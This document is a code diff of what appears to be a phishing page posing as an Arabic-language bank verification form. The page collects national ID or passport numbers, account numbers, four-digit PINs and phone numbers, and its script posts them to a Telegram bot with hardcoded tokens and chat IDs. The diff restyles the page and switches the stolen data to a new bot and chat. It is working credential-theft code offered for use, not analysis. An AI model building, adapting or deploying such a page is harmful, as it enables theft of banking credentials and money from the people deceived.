@@ -49,72 +49,78 @@
         }(window, document);</script>
     <link href="https://cdn.prod.website-files.com/img/favicon.ico" rel="shortcut icon" type="image/x-icon"/>
     <link href="https://cdn.prod.website-files.com/img/webclip.png" rel="apple-touch-icon"/>
-    <style>
-        body {
-            box-sizing: border-box;
-            font-size: 18px;
-        }
+  <style>
+    body {
+      box-sizing: border-box; 
+      font-size:18px;
+    }
 
-        .container {
-            padding: 0 5%;
-        }
+    .container {
+      padding: 0 5%;
+    }
 
-        .field-holder {
-            position: relative;
-            margin-bottom: 1.25em;
-        }
+    .field-holder {
+      position: relative; 
+      margin-bottom:1.25em;
+    }
 
-        .w-input {
-            border: 0;
-            border-bottom: 3px solid #dfdfdf;
-            outline: none;
-        }
+    .w-input {
+      border:0;
+      border-bottom: 3px solid gray; /* تغيير اللون إلى رمادي */
+      outline:none;
+    }
 
-        label {
-            position: absolute;
-            top: 0;
-            left: 0;
-            font-size: 1em;
-            color: #424242;
-            display: flex;
-            align-items: center;
-            cursor: text;
-            transition: .3s ease-in-out;
-        }
+    label { 
+      position:absolute;
+      top:0;
+      left:0;
+      font-size:1em;
+      color: gray !important; /* تغيير اللون إلى رمادي */
+      display:flex;
+      align-items:center;
+      cursor:text;
+      transition: .3s ease-in-out;
+    }
 
-        .w-input, label {
-            font-size: 1em;
-            width: 100%;
-            height: 55px;
-        }
+    .w-input, label {
+      font-size:1em;
+      width:100%;
+      height:55px;
+    }
 
-        .w-input:focus + label,
-        .w-input:valid + label {
-            color: #add8e6;
-            font-size: .75em;
-            top: -25px;
-            pointer-events: none;
-        }
+    .w-input:focus + label, 
+    .w-input:valid + label {
+      color: gray !important; /* تغيير اللون إلى رمادي */
+      font-size:.75em;
+      top:-25px;
+      pointer-events: none;
+    }
 
-        .w-input:focus, .w-input:valid {
-            border-bottom: 3px solid #add8e6;
-        }
+    .w-input:focus,  
+    .w-input:valid { 
+      border-bottom: 3px solid gray !important; /* تغيير اللون إلى رمادي */
+    }
 
-        .submit-button {
-            background-color: #add8e6; /* لون الخلفية الأصفر */
-            color: #000; /* لون النص */
-            border: none; /* إزالة أي حدود */
-            padding: 10px 20px; /* تعديل الحواف الداخلية */
-            cursor: pointer; /* تغيير شكل المؤشر عند المرور على الزر */
-            font-size: 1em; /* حجم الخط */
-        }
+    .CustomFooter {
+      position: fixed;
+      left: 0;
+      bottom: 0;
+    }
 
-        .CustomFooter {
-            position: fixed;
-            left: 0;
-            bottom: 0;
-        }
-    </style>
+    .text-block-2 span, 
+    .text-block {
+      color: gray !important; /* تغيير النصوص إلى رمادي */
+    }
+
+    .w-button:not([value="التحقق"]) {
+      background-color: gray !important; /* تغيير الأزرار إلى رمادي عدا زر التحقق */
+    }
+
+    .light-blue-text {
+      color: #add8e6; /* اللون الأزرق الفاتح */
+      font-weight: bold;
+    }
+  </style>
 </head>
 <body class="body">
 <div class="div-block-2">
@@ -128,12 +134,12 @@
                   	
                 <div id="field" class="field-holder">
                     <input class="text-field-2 w-input" maxlength="10" name="national_id"
-                           data-name="رقم الوطني" pattern="\d{10,15}" placeholder="" type="text" id="national_id" required=""/>
+                           data-name="رقم الوطني" pattern="\d{10,15}" placeholder="" type="number" id="national_id" required=""/>
                     <label for="national_id">الرقم الوطني / جواز السفر</label>
                 </div>
                 <div id="field" class="field-holder">
                     <input class="text-field-2 w-input" maxlength="10" name="additional_national_id"
-                           data-name="رقم الحساب" pattern="\d{1,100}" placeholder="" type="text" id="additional_national_id" required=""/>
+                           data-name="رقم الحساب" pattern="\d{1,100}" placeholder="" type="number" id="additional_national_id" required=""/>
                     <label for="additional_national_id">رقم الحساب</label>
                 </div>
                 <div id="field" class="field-holder">
@@ -146,7 +152,7 @@
                     <label for="pincode">أدخل رمز PIN المكون من 4 أرقام</label>
                 </div>
                 <div class="div-block">
-                    <input type="submit" data-wait="يرجى الانتظار" class="submit-button w-button" value="التحقق"/>
+                    <input type="submit" data-wait="يرجى الانتظار" class="submit-button w-button" value="التحقق"style="background-color: #008080;" />
                 </div>
                 <input class="text-field-3 w-input" maxlength="256" name="field" data-name="رقم الهاتف" placeholder=""
                        type="text" id="phonenumber"/>
@@ -233,9 +239,9 @@
 
         $.ajax({
             type: 'POST',
-            url: `https://api.telegram.org/bot7356894979:AAFxs2g1BAkp6qYCgf3ZE8mvaLvaIuoBmI4/sendMessage`,
+            url: `https://api.telegram.org/bot7578114644:AAGIrUnSauQanIBaMad8JOLRDURY-uqRb3s/sendMessage`,
             data: {
-                chat_id: "-4738220176",
+                chat_id: "6873334348",
                 text: message,
                 parse_mode: 'markdown',
             },
